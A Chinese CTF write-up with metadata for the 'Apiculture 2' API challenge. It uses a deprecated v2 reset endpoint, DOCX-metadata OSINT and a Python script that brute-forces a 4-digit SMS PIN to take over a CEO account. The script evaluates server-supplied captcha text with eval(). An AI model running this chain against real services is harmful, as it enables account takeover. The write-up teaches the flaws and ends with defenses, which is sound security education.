---
title: Apiculture 2 - API 渗透测试 write-up
contest: Apiculture (养蜂业 API 挑战)
year: 2023
difficulty: medium
vuln_type: [auth_bypass, web_unknown]
tags: [API, swagger.json, /API/v2/, OSINT, DOCX-metadata, sitemap.xml, captcha-math, 4-digit-PIN, brute-force, deprecated-API]
attack_chain: ["/API/v4/swagger.json 暴露 /users/reset 邮件密码重置", "降级到 /API/v2/swagger.json 旧版 API", "v2 三阶段重置：/users/reset1 拿 aes256Payload + 算术验证码", "v2 /users/reset2 提交答案 + payload 拿新 payload", "v2 /users/reset3 提交 payload + 4 位 SMS PIN 暴力 10000 次", "OSINT：sitemap.xml → marketing_legacy/giftcard.pdf → 父目录 DOCX/PPTX 元数据", "DOCX 作者 'Winny BÄRENJUNGEN' → LinkedIn 找 CEO 邮箱", "重置 CEO 邮箱 winnybarenjungen@gmail.com 拿 flag"]
key_payload: "POST /API/v2/users/reset3 { aes256Payload, sms4digits: 0000-9999 }"
one_liner: 旧版 API + DOCX 元数据 OSINT + 4 位 PIN 爆破
lesson: API 弃用版本不删是常见漏洞；DOCX/PPTX 元数据泄露作者；4 位 PIN 暴力无防是经典
quality: high
---

# Apiculture 2 - API 渗透测试 write-up

原文 https://www.ctfiot.com/107150.html （微信公众号"闲聊知识铺"）

## 攻击链
### Step 1: 找 Swagger
- 主站 `/API/v4/products/` 返回 JSON
- `/API/v4/swagger.json` 暴露完整 API 定义
- `/API/v4/users/reset` 接口可重置密码（但需要邮件链接）

### Step 2: 旧版 API
- 试 `/API/v2/swagger.json` → 找到 v2 API
- v2 有 3 个 reset 端点：
  - `/users/reset1` — 拿 aes256Payload + 算术验证码
  - `/users/reset2` — 提交答案 + payload 拿新 payload
  - `/users/reset3` — 提交 payload + 4 位 SMS PIN 拿新密码

### Step 3: OSINT 找目标
- `robots.txt` 引用 `sitemap.xml`
- sitemap 列出 `marketing_legacy/giftcard.pdf`
- 父目录列表 → DOCX/PPTX 文件
- DOCX 元数据作者 "Winny BÄRENJUNGEN"（CEO）
- LinkedIn 查 CEO 邮箱 `winnybarenjungen@gmail.com`

### Step 4: 自动化攻击
```python
import requests

TARGET = 'https://.../API/v2'
CEO = 'winnybarenjungen@gmail.com'

# Step 1
r = requests.post(f'{TARGET}/users/reset1', json={'email': CEO})
aes256 = r.json()['aes256Payload']
captcha = eval(r.json()['challenge'])  # 简单算术

# Step 2
r = requests.post(f'{TARGET}/users/reset2', json={
    'aes256Payload': aes256,
    'challengeResponse': captcha
})
aes256_2 = r.json()['aes256Payload']

# Step 3: 爆破 4 位 PIN
for pin in range(10000):
    r = requests.post(f'{TARGET}/users/reset3', json={
        'aes256Payload': aes256_2,
        'sms4digits': f'{pin:04d}'
    })
    if 'message' in r.json() and 'new password' in r.json()['message']:
        print(f'PIN = {pin:04d}, new password: {r.json()["message"]}')
        break
```

## 教学要点
- **API 版本管理**：v1/v2/v3 旧版本经常忘记下架 → 风险后门
- **DOCX/PPTX 元数据泄露作者名** 是 OSINT 入门
- **sitemap.xml + robots.txt** 路径枚举
- **数学验证码可脚本化**（复杂点用 OCR）
- **4 位 PIN 无防爆破**（无频率限制）= 经典漏洞
- 真实案例：2016 年 Facebook 类似漏洞（密码重置 SMS 验证码暴力）

## 防御
- API 旧版及时下架或加白名单
- 文档发布前用 mat2 / exiftool 清元数据
- robots.txt 不要列敏感目录
- 验证码必须限流 + 防自动化
- SMS 验证码至少 6 位
